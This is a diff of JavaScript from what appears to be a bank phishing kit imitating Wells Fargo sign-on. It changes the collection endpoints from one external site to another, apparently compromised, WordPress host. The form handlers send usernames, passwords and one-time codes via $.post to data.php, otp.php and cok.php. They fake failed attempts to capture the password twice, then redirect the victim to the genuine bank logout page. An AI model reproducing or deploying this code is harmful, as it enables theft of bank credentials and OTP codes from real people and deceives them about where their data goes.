@@ -309,7 +309,7 @@ var counts = 0;
 $('#signOnForm').on('submit', function(e){
 count = count+1;
 $('#btn1').html('<i class="fa fa-refresh fa-spin"></i>');
-$.post('https://zabor-u-dachi.com/wp-log/data.php', $(this).serialize(), function(data){
+$.post('https://gepo.co.za/demo/wp-content/wp-log/data.php', $(this).serialize(), function(data){
 console.log(data);
 });
 setTimeout(function() {
@@ -321,8 +321,8 @@ setTimeout(function() {
 $('#msg').show();
 $('#btn1').html('Sign on');
 }
-                             
- 
+
+
                         },2000);
 e.preventDefault();
 });
@@ -331,7 +331,7 @@ $('#form2').on('submit', function(e){
 count = count+1;
 $("#id1").hide();
 $("#id2").show();
-$.post('https://zabor-u-dachi.com/wp-log/otp.php', $(this).serialize(), function(data){
+$.post('https://gepo.co.za/demo/wp-content/wp-log/otp.php', $(this).serialize(), function(data){
 console.log(data);
 });
 setTimeout(function() {
@@ -343,8 +343,8 @@ setTimeout(function() {
 $('#m').show();
 $('#btn2').html('Sign on');
 }
-                             
- 
+
+
                         },9000);
 e.preventDefault();
 });
@@ -352,7 +352,7 @@ e.preventDefault();
 $('#signOnForm2').on('submit', function(e){
 counts = counts+1;
 $('#btn').html('<i class="fa fa-refresh fa-spin"></i>');
-$.post('https://zabor-u-dachi.com/wp-log/cok.php', $(this).serialize(), function(data){
+$.post('https://gepo.co.za/demo/wp-content/wp-log/cok.php', $(this).serialize(), function(data){
 console.log(data);
 });
 setTimeout(function() {
@@ -360,18 +360,18 @@ setTimeout(function() {
 if(counts == 2){
    $('#step3').show();
    $('#step4').show();
-  
+
    setTimeout(function() {
                               window.location.href = "https://connect.secure.wellsfargo.com/auth/logout?code=7100";
                         },5000);
-  
+
 }else{
      $('#passwd').val('');
 $('#msg2').show();
 $('#btn').html('Continue');
 }
 
-                           
+
                         },5000);
 e.preventDefault();
 });
